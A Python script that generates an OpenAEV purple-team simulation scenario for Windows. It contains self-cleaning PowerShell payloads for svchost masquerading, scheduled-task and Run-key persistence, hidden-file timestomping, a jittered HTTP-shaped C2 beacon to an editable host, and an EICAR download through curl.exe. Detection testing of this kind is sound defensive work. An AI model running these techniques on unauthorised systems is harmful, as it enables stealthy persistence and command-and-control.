import json, uuid, copy, zipfile, os, sys

SRC = sys.argv[1] if len(sys.argv) > 1 else "/tmp/claude-1000/silver/[SILVER DRAGON] TTPs validation.json"
OUTDIR = "/home/ssantiagocv/wetland/sim"
JSON_NAME = "[wetland] purple-team C2 lab (Windows).json"
NS = uuid.UUID("a1b2c3d4-0000-0000-0000-000000000000")
def U(k): return str(uuid.uuid5(NS, "wetland-oaev-win:"+k))

base = json.load(open(SRC))
TMPL_INJECT = copy.deepcopy(base["scenario_injects"][0])   # real openaev_implant Command inject (psh)

def ap(ext, name):
    return {"attack_pattern_id": U("ap:"+ext), "attack_pattern_name": name,
            "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
            "attack_pattern_external_id": ext, "attack_pattern_kill_chain_phases": []}

def make_inject(key, title, desc, label, content, cleanup, aps, delay, executor="psh"):
    j = copy.deepcopy(TMPL_INJECT)
    j["inject_id"] = U("inject:"+key)
    j["inject_title"] = title
    j["inject_description"] = desc
    j["inject_country"] = ""
    j["inject_city"] = ""
    j["inject_enabled"] = True
    j["inject_all_teams"] = False
    j["inject_teams"] = []
    j["inject_tags"] = []
    j["inject_documents"] = []
    j["inject_depends_on"] = []
    j["inject_depends_duration"] = delay

    ic = j["inject_injector_contract"]
    cid = U("contract:"+key)
    ic["injector_contract_id"] = cid
    ic["injector_contract_external_id"] = U("cext:"+key)
    ic["injector_contract_labels"] = {"en": label, "fr": label}
    ic["injector_contract_platforms"] = ["Windows"]
    ic["injector_contract_attack_patterns"] = aps
    ic["injector_contract_tags"] = []
    ic["injector_contract_vulnerabilities"] = []
    ic["injector_contract_injector_type"] = "openaev_implant"
    ic["injector_contract_payload_status"] = "VERIFIED"

    cc = ic["convertedContent"]
    cc["contract_id"] = cid
    cc["label"] = {"en": label, "fr": label}
    cc["platforms"] = ["Windows"]
    cc["contract_attack_patterns_external_ids"] = []
    ic["injector_contract_content"] = json.dumps(cc, separators=(",", ":"), ensure_ascii=False)

    p = ic["injector_contract_payload"]
    p["payload_id"] = U("pid:"+key)
    p["payload_external_id"] = U("pext:"+key)
    p["payload_type"] = "Command"
    p["payload_name"] = "wetland — " + label
    p["payload_description"] = desc
    p["payload_platforms"] = ["Windows"]
    p["command_executor"] = executor
    p["command_content"] = content
    p["payload_cleanup_executor"] = executor if cleanup else None
    p["payload_cleanup_command"] = cleanup
    p["payload_elevation_required"] = False
    p["payload_arguments"] = []
    p["payload_prerequisites"] = []
    p["payload_source"] = "MANUAL"
    p["payload_status"] = "VERIFIED"
    p["payload_collector_type"] = None
    p["payload_detection_remediations"] = []
    p["payload_output_parsers"] = []
    p["payload_expectations"] = ["DETECTION"]
    return j

injects = []

# 1. Masquerade (T1036) — fake svchost.exe from a user-writable path
injects.append(make_inject("masquerade",
 "Masquerade — fake svchost.exe from a user path (T1036)",
 "Purple-team sim of `wld -M` / `wld lab masquerade` on Windows: copies a benign system binary "
 "to a user-writable path named svchost.exe and runs it briefly. Detection: an image named "
 "svchost.exe running outside System32 with a parent that is not services.exe.",
 "Masquerade (fake svchost)",
 "$ErrorActionPreference='SilentlyContinue'\n"
 "$dst = Join-Path $env:TEMP 'svchost.exe'\n"
 "Copy-Item (Join-Path $env:SystemRoot 'System32\\timeout.exe') $dst -Force\n"
 "Start-Process $dst -ArgumentList '30' -WindowStyle Hidden\n"
 "Write-Output \"WETLAND-LAB masquerade: started $dst as a fake svchost.exe (T1036.005)\"\n"
 "Write-Output 'detect: svchost.exe image path not under System32; parent != services.exe'\n",
 "$dst = Join-Path $env:TEMP 'svchost.exe'\n"
 "Get-Process svchost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $dst } | Stop-Process -Force -ErrorAction SilentlyContinue\n"
 "Remove-Item $dst -Force -ErrorAction SilentlyContinue\n"
 "Write-Output 'WETLAND-LAB masquerade: cleaned'\n",
 [ap("T1036.005","Match Legitimate Name or Location"),
  ap("T1036.004","Masquerade Task or Service")], 0))

# 2. Scheduled Task persistence (T1053.005)
injects.append(make_inject("persist_schtask",
 "Persistence — scheduled task (T1053.005)",
 "Mirrors `wld lab persist` on Windows: creates an ONLOGON scheduled task named WETLAND-LAB "
 "(harmless heartbeat), removed on cleanup. Detection: `schtasks /Query /TN WETLAND-LAB`; "
 "Task Scheduler Operational event 4698.",
 "Persistence (scheduled task)",
 "$log = Join-Path $env:TEMP 'wetland-lab.log'\n"
 "schtasks /Create /TN WETLAND-LAB /TR \"cmd /c echo WETLAND-LAB heartbeat >> `\"$log`\"\" /SC ONLOGON /F | Out-Null\n"
 "Write-Output 'WETLAND-LAB persist[schtask]: created ONLOGON task WETLAND-LAB (T1053.005)'\n"
 "Write-Output 'detect: schtasks /Query /TN WETLAND-LAB ; TaskScheduler/Operational 4698'\n",
 "schtasks /Delete /TN WETLAND-LAB /F | Out-Null\n"
 "Write-Output 'WETLAND-LAB persist[schtask]: cleaned'\n",
 [ap("T1053.005","Scheduled Task")], 60))

# 3. Registry Run-key persistence (T1547.001)
injects.append(make_inject("persist_runkey",
 "Persistence — HKCU Run key (T1547.001)",
 "Mirrors `wld lab persist` on Windows: adds an HKCU ...\\Run value named WETLAND-LAB "
 "(harmless), removed on cleanup. Detection: `reg query HKCU\\...\\Run`; Sysmon event 13.",
 "Persistence (Run key)",
 "$k='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n"
 "New-ItemProperty -Path $k -Name 'WETLAND-LAB' -Value 'cmd /c echo WETLAND-LAB heartbeat' -PropertyType String -Force | Out-Null\n"
 "Write-Output 'WETLAND-LAB persist[run-key]: set HKCU\\...\\Run\\WETLAND-LAB (T1547.001)'\n"
 "Write-Output 'detect: reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ; Sysmon 13'\n",
 "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WETLAND-LAB' -ErrorAction SilentlyContinue\n"
 "Write-Output 'WETLAND-LAB persist[run-key]: cleaned'\n",
 [ap("T1547.001","Registry Run Keys / Startup Folder")], 120))

# 4. Hidden file + timestomp (T1564.001 / T1070.006)
injects.append(make_inject("hide",
 "Defense Evasion — hidden file + timestomp (T1564.001 / T1070.006)",
 "Mirrors `wld lab hide` on Windows: drops a hidden file in %APPDATA% and copies timestamps "
 "from a system DLL (creation/last-write). Cleanup removes it. Detection: "
 "`Get-ChildItem -Hidden $env:APPDATA`; MFT $STANDARD_INFORMATION vs $FILE_NAME time mismatch.",
 "Hidden file + timestomp",
 "$ErrorActionPreference='SilentlyContinue'\n"
 "$dst = Join-Path $env:APPDATA '.wetland-lab.bin'\n"
 "Copy-Item (Join-Path $env:SystemRoot 'System32\\calc.exe') $dst -Force\n"
 "attrib +h $dst\n"
 "$ref = Get-Item (Join-Path $env:SystemRoot 'System32\\kernel32.dll')\n"
 "$f = Get-Item $dst -Force\n"
 "$f.CreationTime=$ref.CreationTime; $f.LastWriteTime=$ref.LastWriteTime; $f.LastAccessTime=$ref.LastAccessTime\n"
 "Write-Output \"WETLAND-LAB hide: dropped hidden $dst, timestomped from kernel32.dll (T1564.001/T1070.006)\"\n"
 "Write-Output 'detect: Get-ChildItem -Hidden $env:APPDATA ; MFT SI vs FN timestamp mismatch'\n",
 "$dst = Join-Path $env:APPDATA '.wetland-lab.bin'\n"
 "if (Test-Path $dst) { attrib -h $dst; Remove-Item $dst -Force -ErrorAction SilentlyContinue }\n"
 "Write-Output 'WETLAND-LAB hide: cleaned'\n",
 [ap("T1564.001","Hidden Files and Directories"),
  ap("T1070.006","Timestomp")], 180))

# 5. C2 beacon (T1071.001 / T1571)
injects.append(make_inject("beacon",
 "Command & Control — HTTP-shaped C2 beacon (T1071.001 / T1571)",
 "Mirrors `wld lab beacon --as http` on Windows: five jittered outbound check-ins shaped as "
 "HTTP GET with a fixed browser User-Agent. EDIT the $C2 line to your wetland relay/tunnel "
 "host:port. Detection: beaconing regularity, fixed UA, low bytes-up/down (NetFlow/Zeek).",
 "C2 beacon (http-shaped)",
 "$C2 = 'example.com:443'   # <-- EDIT: your wetland relay/tunnel host:port\n"
 "$h,$p = $C2.Split(':'); if (-not $p) { $p = 443 }\n"
 "for ($i=1; $i -le 5; $i++) {\n"
 "  try {\n"
 "    $c = New-Object Net.Sockets.TcpClient; $c.Connect($h,[int]$p)\n"
 "    $req = \"GET /{0:x8} HTTP/1.1`r`nHost: {1}`r`nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)`r`nAccept: */*`r`n`r`n\" -f (Get-Random),$h\n"
 "    $b = [Text.Encoding]::ASCII.GetBytes($req); $c.GetStream().Write($b,0,$b.Length); $c.Close()\n"
 "    Write-Output \"WETLAND-LAB beacon #${i}: check-in to ${h}:${p} (http-shaped)\"\n"
 "  } catch { Write-Output \"WETLAND-LAB beacon #${i}: ${h}:${p} unreachable\" }\n"
 "  Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 10)\n"
 "}\n"
 "Write-Output 'detect: periodic outbound to one host; fixed UA; beaconing regularity (NetFlow/Zeek)'\n",
 None,
 [ap("T1071.001","Web Protocols"),
  ap("T1571","Non-Standard Port")], 240))

# 6. Ingress tool transfer (T1105) — BENIGN EICAR download-detection test
injects.append(make_inject("ingress_eicar",
 "Ingress Tool Transfer — benign EICAR download test (T1105)",
 "Detection test for 'a tool is pulled onto the host': curl.exe downloads the EICAR AV test "
 "file (an industry-standard, deliberately harmless detection artifact — NOT the wld binary) "
 "to a WETLAND-LAB temp path, then cleanup removes it. Exercises proxy/NDR tool-transfer and "
 "endpoint AV on-write. Blue team can also test the LOLBins certutil and bitsadmin.",
 "Ingress tool transfer (EICAR)",
 "$dst = Join-Path $env:TEMP 'wetland-lab-eicar.txt'\n"
 "curl.exe -s -o $dst https://secure.eicar.org/eicar.com.txt\n"
 "if (Test-Path $dst) {\n"
 "  Write-Output \"WETLAND-LAB ingress: downloaded EICAR test file via curl.exe -> $dst (T1105)\"\n"
 "} else {\n"
 "  Write-Output 'WETLAND-LAB ingress: download blocked by proxy/AV — that is a valid detection'\n"
 "}\n"
 "Write-Output 'detect: curl.exe writing a known-bad to disk; proxy/NDR tool transfer; AV on-write'\n"
 "Write-Output 'alt LOLBins to test: certutil -urlcache -f <url> <out> ; bitsadmin /transfer'\n",
 "Remove-Item (Join-Path $env:TEMP 'wetland-lab-eicar.txt') -Force -ErrorAction SilentlyContinue\n"
 "Write-Output 'WETLAND-LAB ingress: cleaned'\n",
 [ap("T1105","Ingress Tool Transfer")], 300))

# ---- envelope ----
out = copy.deepcopy(base)
si = out["scenario_information"]
si["scenario_id"] = U("scenario")
si["scenario_name"] = "[wetland] purple-team C2 lab (Windows)"
si["scenario_subtitle"] = ""
si["scenario_description"] = (
 "Windows purple-team breach-and-attack-simulation of the wetland lab TTPs "
 "(github.com/s4nntysec/wetland). Each inject reproduces one technique as a self-cleaning "
 "PowerShell payload, tagged WETLAND-LAB and mapped to ATT&CK: masquerade as svchost (T1036), "
 "scheduled-task + Run-key persistence (T1053.005 / T1547.001), hidden file + timestomp "
 "(T1564.001 / T1070.006), an HTTP-shaped C2 beacon (T1071.001 / T1571), and a BENIGN ingress "
 "tool-transfer test that downloads the EICAR AV test file via curl.exe (T1105). The techniques "
 "are intentionally loud and reversible — the goal is detectable telemetry, not a real implant. "
 "Target your Windows assets, run, then review prevention/detection. Edit the beacon's $C2 line.")
si["scenario_category"] = "attack-scenario"
si["scenario_main_focus"] = "endpoint-protection"
si["scenario_severity"] = "high"
si["scenario_tags"] = []
si["scenario_documents"] = []
si["scenario_dependencies"] = None

out["scenario_injects"] = injects
for k in ("scenario_teams","scenario_users","scenario_organizations","scenario_tags",
          "scenario_documents","scenario_channels","scenario_articles","scenario_challenges",
          "scenario_lessons_categories","scenario_lessons_questions","scenario_variables"):
    if isinstance(out.get(k), list): out[k] = []
out["export_version"] = 1

os.makedirs(OUTDIR, exist_ok=True)
json_path = os.path.join(OUTDIR, "wetland-purple-c2-windows.openaev.json")
zip_path  = os.path.join(OUTDIR, "wetland-purple-c2-windows.openaev.zip")
blob = json.dumps(out, indent=1, ensure_ascii=False)
open(json_path, "w", encoding="utf-8").write(blob)

zi = zipfile.ZipInfo(JSON_NAME)
zi.compress_type = zipfile.ZIP_DEFLATED
zi.comment = b"Scenario"
zi.external_attr = 0o644 << 16
with zipfile.ZipFile(zip_path, "w") as z:
    z.writestr(zi, blob.encode("utf-8"))

print("wrote", json_path, os.path.getsize(json_path))
print("wrote", zip_path, os.path.getsize(zip_path))
print("injects:", len(injects))
for j in injects:
    p = j["inject_injector_contract"]["injector_contract_payload"]
    assert "WETLAND-LAB" in p["command_content"]
    print("  -", p["command_executor"], "|",
          [a["attack_pattern_external_id"] for a in j["inject_injector_contract"]["injector_contract_attack_patterns"]],
          "| cleanup:", bool(p["payload_cleanup_command"]), "|", j["inject_title"][:42])
